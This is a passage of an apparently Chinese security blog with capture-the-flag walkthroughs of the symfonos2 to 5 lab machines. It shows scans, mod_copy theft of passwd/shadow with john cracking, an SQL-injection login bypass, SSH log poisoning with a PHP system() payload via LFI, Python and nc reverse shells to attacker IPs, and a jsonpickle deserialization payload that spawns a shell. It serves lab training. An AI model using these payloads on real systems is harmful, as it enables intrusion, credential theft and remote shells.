class="line">phpinfo(); ?&gt;' for copying: Permission denied</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">test.php contains contain correct php script "&lt;?php phpinfo(); ?&gt;" which</span><br><span class="line">can be run by the php interpreter</span><br><span class="line"></span><br><span class="line">Source: http://bugs.proftpd.org/show_bug.cgi?id=4169</span><br></pre></td></tr></table></figure>

<p>复制<code>/etc/passwd  /etc/shadow</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">site cpfr /etc/passwd</span><br><span class="line">site cpto /home/aeolus/share/passwd_sym</span><br><span class="line">site cpfr /var/backups/shadow.bak</span><br><span class="line">site cpto /home/aeolus/share/shadow__sym</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unshadow passwd_sym shadow__sym &gt; final_sym -- 这一步生成需要破解的密码 </span><br><span class="line">john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt final_sym</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt final_sym</span><br><span class="line">Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"</span><br><span class="line">Use the "--format=HMAC-SHA256" option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press 'q' or Ctrl-C to abort, almost any other key for status</span><br><span class="line">sergioteamo      (aeolus)</span><br><span class="line">1g 0:00:00:08 DONE (2021-03-27 05:13) 0.1210g/s 3037p/s 3037c/s 3037C/s frazier..raymark</span><br><span class="line">Use the "--show" option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>发现账户密码 <code>aeolus/sergioteamo</code></p>
<h3 id="NMAP扫描本机"><a href="#NMAP扫描本机" class="headerlink" title="NMAP扫描本机"></a>NMAP扫描本机</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2021-03-27 04:17 CDT</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000037s latency).</span><br><span class="line">Not shown: 65527 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)</span><br><span class="line">|_  256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)</span><br><span class="line">25/tcp   open  smtp        Exim smtpd 4.89</span><br><span class="line">| smtp-commands: symfonos2 Hello localhost [127.0.0.1], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp   open  http        WebFS httpd 1.21</span><br><span class="line">|_http-server-header: webfs/1.21</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span><br><span class="line">3306/tcp open  mysql       MySQL 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">|   Thread ID: 12</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">|   Some Capabilities: Support41Auth, SupportsCompression, SupportsTransactions, SupportsLoadDataLocal, LongColumnFlag, LongPassword, Speaks41ProtocolOld, Speaks41ProtocolNew, InteractiveClient, FoundRows, ODBCClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: ,CN&lt;#7,t'a6(b7.&#123;G/U=</span><br><span class="line">|_  Auth Plugin Name: 103</span><br><span class="line">8080/tcp open  http        Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://localhost/login</span><br><span class="line">Service Info: Host: symfonos2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.16-Debian)</span><br><span class="line">|   Computer name: symfonos2</span><br><span class="line">|   NetBIOS computer name: SYMFONOS2\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: symfonos2</span><br><span class="line">|_  System time: 2021-03-27T04:17:24-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smbv2-enabled: Server supports SMBv2 protocol</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>发现<code>8080</code>端口</li>
<li>端口转发</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -N -f -L 8080:127.0.0.1:8080 aeolus@192.168.43.207</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos2/5.png" alt></p>
<h3 id="msf拿到shell"><a href="#msf拿到shell" class="headerlink" title="msf拿到shell"></a>msf拿到shell</h3><p><img data-src="./symfonos2/6.png" alt></p>
<p><img data-src="./symfonos2/7.png" alt></p>
<p><img data-src="./symfonos2/8.png" alt></p>
<ul>
<li>提权，拿<code>flag</code></li>
</ul>
<p><img data-src="./symfonos2/9.png" alt></p>
<ul>
<li><code>sudo mysql -e &quot;\! /bin/bash&quot;</code></li>
</ul>
<p><img data-src="./symfonos2/10.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>symfonos</tag>
      </tags>
  </entry>
  <entry>
    <title>symfonos3</title>
    <url>/2021/03/28/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos3/</url>
    <content><![CDATA[<h1 id="symfonos3"><a href="#symfonos3" class="headerlink" title="symfonos3"></a>symfonos3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>symfonos3</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    fe:ee:df:63:84:20       (Unknown: locally administered)</span><br><span class="line">192.168.43.78   00:0c:29:76:12:91       VMware, Inc.</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.118 seconds (120.87 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.78</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.78</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.78</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-28 00:09 EDT</span><br><span class="line">Nmap scan report for 192.168.43.78</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD 1.3.5b</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)</span><br><span class="line">|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)</span><br><span class="line">|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 00:0C:29:76:12:91 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.09 ms 192.168.43.78</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./symfonos3/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./symfonos3/2.png" alt></p>
<p>登录<a href="http://192.168.43.78/cgi-bin/" target="_blank" rel="noopener">http://192.168.43.78/cgi-bin/</a></p>
<p><img data-src="./symfonos3/3.png" alt></p>
<p>思路有些断了，查看<code>WP</code>发现如下目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/gate</span><br><span class="line">/cgi-bin/underworld</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos3/4.png" alt></p>
<p><img data-src="./symfonos3/5.png" alt></p>
<h3 id="破壳漏洞（CVE-2014-6271）"><a href="#破壳漏洞（CVE-2014-6271）" class="headerlink" title="破壳漏洞（CVE-2014-6271）"></a>破壳漏洞（CVE-2014-6271）</h3><p><img data-src="./symfonos3/6.png" alt></p>
<p><img data-src="./symfonos3/7.png" alt></p>
<p><img data-src="./symfonos3/8.png" alt></p>
<p>拿到<code>shell</code></p>
<h3 id="pspy查看进程"><a href="#pspy查看进程" class="headerlink" title="pspy查看进程"></a>pspy查看进程</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./pspy64 -pf -c -i 1000</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos3/9.png" alt></p>
<p><img data-src="./symfonos3/10.png" alt></p>
<ul>
<li><code>ftp</code>抓包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -i lo</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">hades：PTpZTfU4vxgzvRBE</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh hades@192.168.43.78</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos3/11.png" alt></p>
<p><img data-src="./symfonos3/12.png" alt></p>
<ul>
<li>修改<code>ftplib</code>即可拿到权限</li>
</ul>
<p><img data-src="./symfonos3/13.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"192.168.43.68"</span>,<span class="number">9999</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os; os.system(<span class="string">'nc -e /bin/bash 192.168.43.86 9999'</span>)</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos3/14.png" alt></p>
<p><img data-src="./symfonos3/15.png" alt></p>
<ul>
<li>进程再次执行，反弹<code>root shell</code></li>
</ul>
<p><img data-src="./symfonos3/16.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>symfonos</tag>
      </tags>
  </entry>
  <entry>
    <title>symfonos4</title>
    <url>/2021/04/04/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos4/</url>
    <content><![CDATA[<h1 id="symfonos4"><a href="#symfonos4" class="headerlink" title="symfonos4"></a>symfonos4</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>symfonos4</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">\Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    30:45:96:e4:ed:56       HUAWEI TECHNOLOGIES CO.,LTD</span><br><span class="line">192.168.43.33   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.168  08:00:27:33:ee:42       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.154  a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line">192.168.43.191  38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.168</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.168</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.168</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-04 01:20 EDT</span><br><span class="line">Nmap scan report for symfonos4 (192.168.43.168)</span><br><span class="line">Host is up (0.0015s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f (RSA)</span><br><span class="line">|   256 be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 (ECDSA)</span><br><span class="line">|_  256 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:33:EE:42 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.53 ms symfonos4 (192.168.43.168)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.51 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./symfonos4/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.43.168/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# dirb http://192.168.43.168/ /usr/share/wordlists/dirb/big.txt -X .php</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Apr  4 01:26:12 2021</span><br><span class="line">URL_BASE: http://192.168.43.168/</span><br><span class="line">WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt</span><br><span class="line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 20458                                                         </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.43.168/ ----</span><br><span class="line">+ http://192.168.43.168/atlantis.php (CODE:200|SIZE:1718)                                                                                                                              </span><br><span class="line">+ http://192.168.43.168/sea.php (CODE:302|SIZE:0)                                                                                                                                      </span><br><span class="line">                                                                                                                                                                                       </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Apr  4 01:26:38 2021</span><br><span class="line">DOWNLOADED: 20458 - FOUND: 2</span><br></pre></td></tr></table></figure>



<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./symfonos4/2.png" alt></p>
<ul>
<li><a href="http://192.168.43.168/manual/" target="_blank" rel="noopener">http://192.168.43.168/manual/</a></li>
</ul>
<p><img data-src="./symfonos4/3.png" alt></p>
<ul>
<li><a href="http://192.168.43.168/atlantis.php" target="_blank" rel="noopener">http://192.168.43.168/atlantis.php</a></li>
</ul>
<p><img data-src="./symfonos4/4.png" alt></p>
<h3 id="登录前端页面"><a href="#登录前端页面" class="headerlink" title="登录前端页面"></a>登录前端页面</h3><ul>
<li>弱口令<code>or</code>注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 万能密码成功登录</span></span><br><span class="line">' or 1 = 1 #  / 123</span><br></pre></td></tr></table></figure>

<ul>
<li>文件包含漏洞</li>
</ul>
<p><img data-src="./symfonos4/5.png" alt></p>
<p><img data-src="./symfonos4/6.png" alt></p>
<h3 id="ssh日志-lfi拿shell"><a href="#ssh日志-lfi拿shell" class="headerlink" title="ssh日志 lfi拿shell"></a>ssh日志 lfi拿shell</h3><p><a href="https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/" target="_blank" rel="noopener">https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh '&lt;?php system($_GET['wei']); ?&gt;'@192.168.43.168</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos4/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">http://192.168.43.168/sea.php?file=../../../../var/log/auth&amp;wei=nc -e /bin/bash 192.168.43.86 8833</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos4/8.png" alt></p>
<h3 id="拿到shell，进入后台"><a href="#拿到shell，进入后台" class="headerlink" title="拿到shell，进入后台"></a>拿到shell，进入后台</h3><p><img data-src="./symfonos4/9.png" alt></p>
<ul>
<li>上传脚本，尝试提权</li>
</ul>
<p>发现内部服务器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root       528  0.0  1.5  27252 15768 ?        S    00:14   0:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app</span><br><span class="line">root       529  0.0  1.5  27308 15800 ?        S    00:14   0:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app</span><br><span class="line">root       531  0.0  1.5  27308 15804 ?        S    00:14   0:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app</span><br></pre></td></tr></table></figure>

<p>端口转发</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:9933,fork TCP:127.0.0.1:8080</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos4/10.png" alt></p>
<p><img data-src="./symfonos4/11.png" alt></p>
<ul>
<li>目测存在反序列话问题(<code>python</code>)</li>
</ul>
<p><img data-src="./symfonos4/12.png" alt></p>
<ul>
<li>查看源码</li>
</ul>
<p><img data-src="./symfonos4/13.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#x2F;opt&#x2F;code&#x2F;app.py</span><br><span class="line">from flask import Flask, request, render_template, current_app, redirect</span><br><span class="line"></span><br><span class="line">import jsonpickle</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">class User(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, username):</span><br><span class="line">        self.username &#x3D; username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    if request.cookies.get(&quot;username&quot;):</span><br><span class="line">        u &#x3D; jsonpickle.decode(base64.b64decode(request.cookies.get(&quot;username&quot;)))</span><br><span class="line">        return render_template(&quot;index.html&quot;, username&#x3D;u.username)</span><br><span class="line">    else:</span><br><span class="line">        w &#x3D; redirect(&quot;&#x2F;whoami&quot;)</span><br><span class="line">        response &#x3D; current_app.make_response(w)</span><br><span class="line">        u &#x3D; User(&quot;Poseidon&quot;)</span><br><span class="line">        encoded &#x3D; base64.b64encode(jsonpickle.encode(u))</span><br><span class="line">        response.set_cookie(&quot;username&quot;, value&#x3D;encoded)</span><br><span class="line">        return response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;whoami&#39;)</span><br><span class="line">def whoami():</span><br><span class="line">    user &#x3D; jsonpickle.decode(base64.b64decode(request.cookies.get(&quot;username&quot;)))</span><br><span class="line">    username &#x3D; user.username</span><br><span class="line">    return render_template(&quot;whoami.html&quot;, username&#x3D;username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/j0lt-github/python-deserialization-attack-payload-generator/blob/master/peas.py</span></span><br><span class="line">&#123;"py/object":"main.Shell","py/reduce":[&#123;"py/type":"os.system"&#125;,&#123;"py/tuple":["/usr/bin/nc -e /bin/bash 192.168.43.86 9999"]&#125;,null,null,null]&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">eyJweS9vYmplY3QiOiJtYWluLlNoZWxsIiwicHkvcmVkdWNlIjpbeyJweS90eXBlIjoib3Muc3lzdGVtIn0seyJweS90dXBsZSI6WyIvdXNyL2Jpbi9uYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC40My44NiA5OTk5Il19LG51bGwsbnVsbCxudWxsXX0K</span><br></pre></td></tr></table></figure>

<p><img data-src="./symfonos4/14.png" alt></p>
<p><img data-src="./symfonos4/15.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>symfonos</tag>
      </tags>
  </entry>
  <entry>
    <title>symfonos5</title>
    <url>/2021/04/28/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos5/</url>
    <content><![CDATA[<h1 id="symfonos5"><a href="#symfonos5" class="headerlink" title="symfonos5"></a>symfonos5</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>symfonos5</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.4.75</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.142   08:00:27:b3:88:01       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.967 seconds (130.15 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.142</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.4.142</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.4.142</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-28 05:03 EDT</span><br><span class="line">Nmap scan report for symfonos5.lan (192.168.4.142)</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)</span><br><span class="line">|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)</span><br><span 